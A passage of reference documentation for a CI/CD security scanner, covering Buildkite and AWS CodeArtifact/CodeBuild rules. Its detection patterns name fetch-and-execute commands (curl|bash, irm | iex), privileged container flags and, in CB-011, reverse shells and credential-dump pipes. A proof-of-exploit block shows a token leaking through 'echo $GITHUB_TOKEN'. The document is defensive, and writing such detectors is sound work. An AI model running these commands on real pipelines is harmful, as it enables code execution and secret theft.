**Recommendation.** Don't interpolate ``$BUILDKITE_BRANCH``, ``$BUILDKITE_TAG``, ``$BUILDKITE_MESSAGE``, ``$BUILDKITE_PULL_REQUEST_*``, or ``$BUILDKITE_BUILD_AUTHOR*`` directly into shell commands. These come from the pull request / branch and are attacker-controllable. Quote them and assign to a local variable first (``branch="$BUILDKITE_BRANCH"; ./script --branch "$branch"``), or pass them as arguments to a script you own.

**Known false positives.**

- The single-token double-quoted form (``"$BUILDKITE_BRANCH"``) is already excluded; multi-token shell snippets that *look* unquoted but are consumed safely by the downstream tool (e.g. a ``./script.sh $BUILDKITE_BRANCH`` where the script treats argv as data and never re-evaluates) still flag. The rule has no AST-level understanding of the called script, suppress per-step via ``--ignore-file`` once you've verified the script handles untrusted argv safely (or quote the use, which is the better fix).

**Source:** [`BK-003`](../providers/buildkite.md#bk-003) in the [Buildkite provider](../providers/buildkite.md).

### `BK-004`: Remote script piped into shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-004 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Uses the cross-provider ``_primitives.remote_script_exec`` detector shared with GHA-016 / GL-016 / GCB-010 / DF-004 / ARGO-008 / TKN-008. Catches ``curl|bash``, ``curl|sh``, ``wget|bash``, ``bash -c "$(curl …)"``, ``python -c urllib.urlopen``, ``curl > x.sh && bash x.sh``, and the PowerShell ``irm | iex`` variants. Use ``curl -fsSLO <url>; sha256sum -c install.sh.sha256; bash install.sh`` instead.

**Recommendation.** Download the installer to disk, verify a checksum or signature, then execute it. ``curl ... | sh`` lets the remote host change what runs in your pipeline at any time, and any TLS / DNS error during download silently feeds a partial script to the shell.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BK-004`](../providers/buildkite.md#bk-004) in the [Buildkite provider](../providers/buildkite.md).

### `BK-005`: Container started with --privileged or host-bind escalation <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-005 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Detection fires on ``--privileged``, ``--cap-add=SYS_ADMIN``, ``--pid=host`` / ``--ipc=host`` / ``--userns=host``, and explicit mounts of the host Docker socket (``/var/run/docker.sock``).

**Recommendation.** Drop ``--privileged``, ``--cap-add=SYS_ADMIN``, ``--pid=host``, and ``-v /var/run/docker.sock`` from container invocations. If the workload needs Docker-in-Docker, use a build-specific rootless option (``buildx``, ``kaniko``, ``buildah --isolation=chroot``) instead of opening the host kernel and the agent's Docker socket to the build script.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BK-005`](../providers/buildkite.md#bk-005) in the [Buildkite provider](../providers/buildkite.md).

### `BK-006`: Step has no timeout_in_minutes <span class="pg-sev pg-sev--low">LOW</span> { #detail-bk-006 }

**Evidences:** [`ESF-D-BUILD-TIMEOUT`](#ctrl-esf-d-build-timeout) Enforce bounded build execution (single-use, time-limited).

**How this is detected.** Buildkite has no implicit timeout; agents will wait forever. Set ``timeout_in_minutes:`` per step. The pipeline-level default counts, a global ``steps:`` block with ``timeout_in_minutes:`` is fine, since Buildkite copies it to each step.

**Recommendation.** Set ``timeout_in_minutes:`` on every command step. A compromised dependency or a hung test can otherwise hold an agent indefinitely, blocking parallel pipelines and running up self-hosted-runner cost. Pick a value generous enough for the slowest legitimate run (e.g. 30 for a typical build, 90 for an integration suite).

**Known false positives.**

- Steps that genuinely need >24h (rare; database migrations, ML training jobs), set ``timeout_in_minutes: 1440`` explicitly so the absence of a timeout is intentional.

**Source:** [`BK-006`](../providers/buildkite.md#bk-006) in the [Buildkite provider](../providers/buildkite.md).

### `BK-007`: Deploy step not gated by a manual block / input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-007 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment.

**How this is detected.** A step is treated as a deploy when its label, key, or any command line contains a deploy keyword (``deploy``, ``ship``, ``release``, ``promote``, ``apply``, ``rollout``, ``terraform apply``, ``kubectl apply``, ``helm upgrade``, ``aws ecs update-service``). The check passes when at least one preceding step in the same pipeline file is a ``block:`` or ``input:`` flow-control step.

**Recommendation.** Insert a ``- block: "Deploy?"`` (or ``- input:`` step) in front of every deploy step. Buildkite waits for a human to click *Unblock* before the gated steps run, which prevents an unreviewed merge from auto-deploying to production. Combine with ``branches: main`` so the gate only appears on release branches.

**Known false positives.**

- Pipelines where the deploy gate lives in a triggered pipeline rather than the local file, the local pipeline looks ungated even though the actual deploy is gated downstream. Add a no-op ``block:`` to silence.

**Source:** [`BK-007`](../providers/buildkite.md#bk-007) in the [Buildkite provider](../providers/buildkite.md).

### `BK-008`: TLS verification disabled in step command <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-008 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Uses the cross-provider ``_primitives.tls_bypass`` detector so detection stays aligned with GHA-027 / GL-023 / JF-022 / ADO-026 / CC-024 / GCB-011 / DR-006. Covers curl / wget / git / npm / yarn / pip / helm / kubectl / ssh / docker / maven / gradle / aws bypasses. Partial-word matches (``--insecure-protocols``) are excluded.

**Recommendation.** Drop ``curl -k`` / ``--insecure``, ``wget --no-check-certificate``, ``git -c http.sslVerify=false``, and ``pip install --trusted-host``. If a CA isn't trusted, install it into the agent's trust store (``update-ca-certificates``) rather than disabling validation pipeline-wide. A compromised intermediate that strips TLS gets a free hand with every fetch the step performs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BK-008`](../providers/buildkite.md#bk-008) in the [Buildkite provider](../providers/buildkite.md).

### `BK-009`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-009 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

**How this is detected.** Unsigned artifacts can't be verified downstream, a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools, matching the shared signing-token catalog used by the other CI packs.

**Recommendation.** Add a signing step, install cosign once (``brew install cosign`` in the agent image, or a ``cosign-install`` plugin) and call ``cosign sign --yes <ref>`` after the build. For container images pushed to ECR / GCR / GHCR, the same call signs by digest. Publish the signature alongside the artifact and verify it at consumption time.

**Source:** [`BK-009`](../providers/buildkite.md#bk-009) in the [Buildkite provider](../providers/buildkite.md).

### `BK-010`: No SBOM generated for build artifacts <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-010 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** An SBOM (CycloneDX or SPDX) records every component baked into the build. Without one, post-incident triage can't answer ``did this CVE ship?`` for a given artifact. Detection uses the shared SBOM-token catalog, syft, cyclonedx, cdxgen, spdx-tools, microsoft/sbom-tool.

**Recommendation.** Add an SBOM-generation step. ``syft <artifact> -o cyclonedx-json > sbom.json`` runs in any standard agent image; ``cyclonedx-cli`` and ``cdxgen`` are alternative producers. Upload the SBOM via ``buildkite-agent artifact upload`` so downstream consumers (and incident-response tooling) can match deployed artifacts to the components they were built from.

**Source:** [`BK-010`](../providers/buildkite.md#bk-010) in the [Buildkite provider](../providers/buildkite.md).

### `BK-011`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-011 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release, [`ESF-S-PROVENANCE`](#ctrl-esf-s-provenance) Generate and verify provenance metadata (SLSA / in-toto) for produced artifacts.

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves *who* published it; a provenance attestation proves *where / how* it was built. Without it, a leaked signing key forges identity but a leaked build environment also forges provenance. You need both for the SLSA L3 non-falsifiability guarantee. Detection uses the shared provenance-token catalog (``slsa-framework``, ``cosign attest``, ``in-toto``, ``attest-build-provenance``).

**Recommendation.** Run ``cosign attest --predicate slsa.json`` (or the SLSA-framework generator from a build-time step) after the build completes. The predicate records the build inputs and the agent that produced the artifact. Publish the attestation alongside the artifact so consumers can verify *how* it was built, not just *who* signed it.

**Source:** [`BK-011`](../providers/buildkite.md#bk-011) in the [Buildkite provider](../providers/buildkite.md).

### `BK-012`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-012 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Vulnerability scanning sits at a different layer from signing and SBOM. It answers ``does this artifact ship a known CVE?`` rather than ``can we verify what it is?``. Detection uses the shared vuln-scan-token catalog: trivy, grype, snyk, npm-audit, pip-audit, anchore, dependency-check, checkov, semgrep.

**Recommendation.** Add a vulnerability scanner, ``trivy fs .`` for source / filesystem, ``trivy image <ref>`` for container images, ``grype`` and ``snyk`` for either. Add ``npm audit`` / ``pip-audit`` for language-specific dep audits. Fail the step on findings above a chosen severity so a regression blocks the merge instead of shipping.

**Source:** [`BK-012`](../providers/buildkite.md#bk-012) in the [Buildkite provider](../providers/buildkite.md).

### `BK-013`: Deploy step has no branches: filter <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-013 }

**Evidences:** [`ESF-C-ENV-SEP`](#ctrl-esf-c-env-sep) Separate deployment environments (dev / staging / prod).

**How this is detected.** A step is treated as a deploy when its label, key, or any command line contains a deploy keyword (``deploy``, ``ship-it``, ``release``, ``promote``, ``rollout``, ``helm upgrade``, ``kubectl apply``, ``terraform apply``, ``aws ecs update-service``, ``aws lambda update-function-code``, ``gcloud run deploy``). The check passes when the step declares ``branches:`` with at least one literal branch name (a wildcard like ``"*"`` is treated as an explicit opt-out, not a passing filter, and still trips). The pipeline-level default also counts, top-level ``steps:`` with ``branches:`` propagates.

**Recommendation.** Add ``branches: "main release/*"`` (or your release branch glob) to every deploy step. Buildkite skips the step on any other branch, which prevents a feature-branch PR from accidentally promoting code to production. Combine with BK-007's manual ``block:`` so a release branch *plus* a human approval is the path to deploy.

**Known false positives.**

- Trunk-based teams that branch-protect ``main`` and treat every merge as a deploy candidate may not use ``branches:``. Add ``branches: main`` to make the policy explicit, or ignore BK-013 in ``.pipeline-check-ignore.yml`` with a scope of ``main``-only repos.

**Source:** [`BK-013`](../providers/buildkite.md#bk-013) in the [Buildkite provider](../providers/buildkite.md).

### `BK-014`: Step commands run unpinned package installs <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-014 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Detection reuses the cross-provider primitives ``PKG_INSECURE_RE`` and ``PKG_NO_LOCKFILE_RE`` from ``checks/base.py``. Same rule pack already exists for GHA (``GHA-021`` / ``GHA-022``), GitLab (``GL-021`` / ``GL-022``), Bitbucket / Azure DevOps / Jenkins / CircleCI / Cloud Build / Drone. Buildkite was a gap; this closes it.

Insecure variants (``PKG_INSECURE_RE``): ``pip --index-url http://``, ``pip --trusted-host``, ``npm --registry http://``, ``gem --source http://``, ``nuget --Source http://``, ``cargo --index http://``. Lockfile-bypass variants (``PKG_NO_LOCKFILE_RE``): ``npm install`` (should be ``npm ci``), bare ``pip install <pkg>`` without ``-r`` or ``--require-hashes``, ``yarn install`` without ``--frozen-lockfile``, ``bundle install`` without ``--frozen``, ``cargo install``, ``go install`` without an ``@vN.N`` pin, ``poetry install`` without ``--no-update``.

**Recommendation.** Pin every package install to a lockfile or a checksum-verified version. ``npm ci`` (not ``npm install``), ``yarn install --frozen-lockfile``, ``pip install -r requirements.txt --require-hashes``, ``bundle install --frozen``. Don't use ``--trusted-host`` / ``--no-verify`` / a non-HTTPS index URL — those bypass TLS or trust validation entirely (BK-008 covers the TLS subset; this rule covers the lockfile subset).

**Known false positives.**

- Bootstrap-stage installs that intentionally pull latest (``apt-get install -y curl`` for a tooling image rebuild) sometimes legitimately bypass the lockfile. Suppress via ignore-file scoped to the specific step label when this is the deliberate shape; the broader pinning policy still covers the rest of the pipeline.

**Source:** [`BK-014`](../providers/buildkite.md#bk-014) in the [Buildkite provider](../providers/buildkite.md).

### `BK-015`: agents map interpolates attacker-controllable Buildkite variable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-015 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Buildkite uses an ``agents:`` map to route a step to a specific runner pool. Both the top-level ``agents:`` and the per-step override are scanned. Detection mirrors BK-003's tainted-variable list (``$BUILDKITE_BRANCH``, ``$BUILDKITE_TAG``, ``$BUILDKITE_MESSAGE``, ``$BUILDKITE_PULL_REQUEST_*``, ``$BUILDKITE_BUILD_AUTHOR*``, ``$BUILDKITE_COMMIT``). The pattern matches what GHA-036, GL-032, JF-032, ADO-030, and CC-031 already enforce on the other CI providers; closes parity for Buildkite.

Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fire (Buildkite doesn't shell-eval the agents map anyway, but the value still substitutes), only the unquoted single-token interpolation does.

**Recommendation.** Pin every ``agents:`` map entry to a static literal that matches your runner targeting policy. ``queue: linux-amd64`` or ``os: linux`` is fine; ``queue: $BUILDKITE_BRANCH`` is not, because the pusher can route their build to whichever agent pool they want, including a privileged pool reserved for the deploy step. Production runner pools should also carry a tag the agent itself enforces (e.g. ``buildkite-agent start --tags 'queue=production'`` plus a queue-allow-list on the API token), so the rule is one layer of a defense-in-depth posture.

**Known false positives.**

- Some teams use a static prefix plus a CI-controlled tail (``queue: build-$BUILDKITE_PIPELINE_SLUG``) to share an agent pool across pipelines. ``BUILDKITE_PIPELINE_SLUG`` is not pusher-controllable so it isn't on the tainted list, but if your team has its own conventions for trusted Buildkite vars, suppress on the specific step.

**Source:** [`BK-015`](../providers/buildkite.md#bk-015) in the [Buildkite provider](../providers/buildkite.md).

### `CA-000`: CodeArtifact API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-ca-000 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`CA-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CA-001`: CodeArtifact domain not encrypted with customer KMS CMK <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ca-001 }

**Evidences:** [`ESF-C-ARTIFACT-AUTHZ`](#ctrl-esf-c-artifact-authz) Restrict access to artifact storage and deployment pipelines.

**How this is detected.** AWS-owned encryption (the default ``alias/aws/codeartifact`` key) keeps the key policy under AWS's control, not yours. That's fine for confidentiality but means cross-account auditability of every Decrypt event lives with AWS, and you can't revoke or scope key access without recreating the domain. A customer-managed CMK puts both controls back in your hands.

**Recommendation.** Recreate the CodeArtifact domain with an encryption-key argument pointing at a customer-managed CMK. Domain encryption is set at creation and cannot be changed after.

**Source:** [`CA-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CA-002`: CodeArtifact repository has a public external connection <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ca-002 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** An external connection to ``public:npmjs`` / ``public:pypi`` / ``public:nuget`` / ``public:maven-central`` fetches packages from the public registry on first resolution. A typo-squat (``request`` vs ``requests``) or a compromised upstream lands in the cache the first time anyone names it; every subsequent build pulls the cached substitute. The pull-through cache with an allow-list is the same risk shape solved by an explicit allowlist.

**Recommendation.** Route public package consumption through a pull-through cache repository governed by an allow-list of package names, and point build-time repos at that cache rather than directly at ``public:npmjs``/``public:pypi``. Unscoped public upstreams expose builds to dependency-confusion and typosquatting attacks.

**Source:** [`CA-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CA-003`: CodeArtifact domain policy allows cross-account wildcard <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ca-003 }

**Evidences:** [`ESF-C-ARTIFACT-AUTHZ`](#ctrl-esf-c-artifact-authz) Restrict access to artifact storage and deployment pipelines.

**How this is detected.** A wildcard-principal Allow on a CodeArtifact domain lets any AWS account reach the domain's permissions surface. The exact damage depends on the action set, but at minimum it lets external accounts read package names and versions, which is enough for typosquat-against-private-package attacks. ``aws:PrincipalOrgID`` is the org-level rescue without enumerating accounts.

**Recommendation.** Remove Allow statements with ``Principal: '*'`` from every CodeArtifact domain permissions policy, or restrict them with an ``aws:PrincipalOrgID`` condition so only accounts in your org can consume packages from the domain.

**Source:** [`CA-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CA-004`: CodeArtifact repo policy grants ``codeartifact:*`` with ``Resource '*'`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ca-004 }

**Evidences:** [`ESF-C-ARTIFACT-AUTHZ`](#ctrl-esf-c-artifact-authz) Restrict access to artifact storage and deployment pipelines.

**How this is detected.** ``codeartifact:*`` on ``Resource: '*'`` collapses the entire repository's authority into one grant: the holder can read, write, delete, dispose, and re-publish every package. Even for a service principal that nominally only consumes packages, the grant lets a compromise of that consumer rewrite every dependency the team relies on.

**Recommendation.** Scope Allow statements to specific ``codeartifact:`` actions (e.g. ``codeartifact:ReadFromRepository``) and to specific package-group ARNs. Wildcard action + wildcard resource is the classic over-broad grant that lets a consumer also publish.

**Source:** [`CA-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-000`: CodeBuild API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-cb-000 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`CB-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-001`: Secrets in plaintext environment variables <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-cb-001 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Flags a plaintext env var when either (a) its **name** matches a secret-like pattern (PASSWORD, TOKEN, API_KEY, ...) or (b) its **value** matches a known credential shape (AKIA/ASIA access keys, GitHub tokens, Slack xox* tokens, JWTs). Plaintext values are visible in the AWS console, CloudTrail, and build logs to anyone with read access.

**Recommendation.** Move secrets to AWS Secrets Manager or SSM Parameter Store and reference them using type SECRETS_MANAGER or PARAMETER_STORE in the CodeBuild environment variable configuration.

**Proof of exploit.**

```
# Vulnerable: CodeBuild project with a plaintext PAT in env.
{
  "name": "deploy",
  "environment": {
    "environmentVariables": [
      {"name": "GITHUB_TOKEN",
       "value": "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
       "type": "PLAINTEXT"}
    ]
  }
}

# Exposure surface (no exploit needed, the value just leaks):
#  - codebuild:BatchGetProjects returns the value to anyone with
#    that permission (often broader than `codebuild:StartBuild`).
#  - CloudTrail's UpdateProject / CreateProject events record
#    the full env block in audit logs.
#  - The buildspec can ``echo $GITHUB_TOKEN`` and the value
#    lands in the build log group, readable by anyone with
#    logs:GetLogEvents on the group.
#  - The AWS console shows the value to anyone with project
#    read access; no separate decrypt permission gates it.

# Safe: reference Secrets Manager / SSM, never store the
# plaintext on the project.
{
  "name": "deploy",
  "environment": {
    "environmentVariables": [
      {"name": "GITHUB_TOKEN",
       "value": "arn:aws:secretsmanager:us-east-1:111111111111:secret:gh-pat-AbCdEf",
       "type": "SECRETS_MANAGER"}
    ]
  }
}
```

**Source:** [`CB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-002`: Privileged mode enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cb-002 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers), [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Privileged mode grants the build container root access to the host's Docker daemon. A compromised build can escape the container or tamper with the host. Only flip this on for real Docker-in-Docker workloads and keep the buildspec under branch-protected review.

**Recommendation.** Disable privileged mode unless the project explicitly requires Docker-in-Docker builds. If required, ensure the buildspec is tightly controlled, peer-reviewed, and sourced from a trusted repository with branch protection.

**Source:** [`CB-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-003`: Build logging not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-003 }

**Evidences:** [`ESF-D-BUILD-LOGS`](#ctrl-esf-d-build-logs) Generate and preserve build audit logs, [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** A CodeBuild project with neither CloudWatch Logs nor S3 logging enabled leaves no durable record of what the build did. The CodeBuild console shows the last execution's logs for a short retention window, but anything older, and any automated review of historical activity during incident response, is gone.

**Recommendation.** Enable CloudWatch Logs or S3 logging in the CodeBuild project configuration to maintain a durable audit trail of all build activity.

**Source:** [`CB-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-004`: No build timeout configured <span class="pg-sev pg-sev--low">LOW</span> { #detail-cb-004 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers), [`ESF-D-BUILD-TIMEOUT`](#ctrl-esf-d-build-timeout) Enforce bounded build execution (single-use, time-limited).

**How this is detected.** A CodeBuild project at AWS's 480-minute maximum is rarely deliberate. Without a tighter ceiling, a runaway test loop, a fork-PR cryptomining payload, or a build that hangs on stdin keeps the build host (and its IAM role) live for the full eight hours, racking up cost and extending the compromise window.

**Recommendation.** Set a build timeout appropriate for your expected build duration (typically 15–60 minutes) to limit the blast radius of a runaway or abused build.

**Source:** [`CB-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-005`: Outdated managed build image <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-005 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Only AWS-managed ``aws/codebuild/standard:N.0`` images are version-checked. Custom or third-party images pass here, CB-009 handles the separate concern of tag vs digest pinning for custom images.

**Recommendation.** Update the CodeBuild environment image to aws/codebuild/standard:7.0 or later to ensure the build environment receives the latest security patches.

**Known false positives.**

- One version behind the current ``aws/codebuild/standard`` is a hygiene warning, not a production issue, and defaults to MEDIUM confidence. The rule emits HIGH only when the project is two or more versions behind. Custom or third-party images are not version-checked here; CB-009 handles tag-vs-digest pinning for those.

**Source:** [`CB-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-006`: CodeBuild source auth uses long-lived token <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cb-006 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** OAUTH / PERSONAL_ACCESS_TOKEN / BASIC_AUTH source credentials are stored long-lived on the account and used by every CodeBuild project that points at the SCM provider. Rotating the upstream PAT requires manual re-credentialing here too. CodeConnections (CodeStar) is the AWS-managed alternative with token refresh and revocation.

**Recommendation.** Switch to an AWS CodeConnections (CodeStar) connection and reference it from the source configuration. Delete any stored source credentials of type OAUTH, PERSONAL_ACCESS_TOKEN, or BASIC_AUTH via delete_source_credentials.

**Source:** [`CB-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-007`: CodeBuild webhook has no filter group <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-007 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** A CodeBuild webhook with no filter groups fires on every push and every PR from any actor, including fork PRs from outside the org. Anyone able to open a PR triggers the build with whatever IAM authority the project's role carries. Filter groups (branch + actor + event type) are the gate.

**Recommendation.** Define filter groups restricting triggers to specific branches, actors, and event types.

**Source:** [`CB-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-008`: CodeBuild buildspec is inline (not sourced from a protected repo) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cb-008 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** An inline buildspec (source.buildspec set to YAML text, or a S3 URL) bypasses the protections that cover your source code. A user with ``codebuild:UpdateProject`` can rewrite the build commands without touching the repository, no PR review, no branch protection, no audit of what changed. Store buildspec.yml in the repo instead.

**Recommendation.** Remove the inline buildspec and store buildspec.yml in the source repository under branch protection. Anyone with codebuild:UpdateProject can silently rewrite an inline buildspec; repository-sourced buildspecs inherit the repo's review and protection controls.

**Source:** [`CB-008`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-009`: CodeBuild image not pinned by digest <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-009 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** CodeBuild pulls the environment image on every build. A tag pointer can be moved by whoever controls the registry; a digest cannot. AWS-managed ``aws/codebuild/...`` images are exempt. Those are covered by CB-005 and are not part of the tag-mutation threat model.

**Recommendation.** Pin custom CodeBuild images by ``@sha256:<digest>``. Tag-based references (``:latest``, ``:1.2.3``) can be silently overwritten to point at a malicious layer that is pulled on the next build.

**Source:** [`CB-009`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-010`: CodeBuild webhook allows fork-PR builds without actor filtering <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cb-010 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** GitHub/Bitbucket webhook filter groups that fire on pull-request events will build forks by default. Because CodeBuild runs with the project's own IAM role (not the PR author's), a fork PR can execute arbitrary code with CI privileges and exfiltrate secrets. Restrict to known contributors with an ``ACTOR_ACCOUNT_ID`` pattern group.

**Recommendation.** Add an ``ACTOR_ACCOUNT_ID`` filter pattern to every webhook filter group that accepts ``PULL_REQUEST_CREATED`` / ``PULL_REQUEST_UPDATED`` / ``PULL_REQUEST_REOPENED``, or remove those PR event types. Without actor filtering, any fork can trigger a build that runs with the project's service role.

**Source:** [`CB-010`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-011`: CodeBuild buildspec contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-cb-011 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Scans the ``source.buildspec`` text on every CodeBuild project for concrete attack indicators: reverse shells, base64-decoded execution, miner binaries/pools, Discord/Telegram webhooks, credential-dump pipes, audit-erasure commands. CB-011 is CRITICAL by design, a true positive is evidence of compromise, not a hygiene improvement. Repo-sourced buildspecs (not inlined) return ``NOT APPLICABLE`` because the text isn't visible to the scanner; CB-008 already flags the inline form as a governance gap.

**Recommendation.** Treat as a potential compromise. Identify which principal or pipeline ran the CodeBuild project recently, rotate its service role's credentials, audit CloudTrail for outbound activity to the matched hosts, and, if an inline buildspec is in use (CB-008), enforce repo-sourced buildspecs under branch protection so the next malicious edit requires a PR.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`CB-011`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CC-001`: Orb not pinned to exact semver <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-001 }

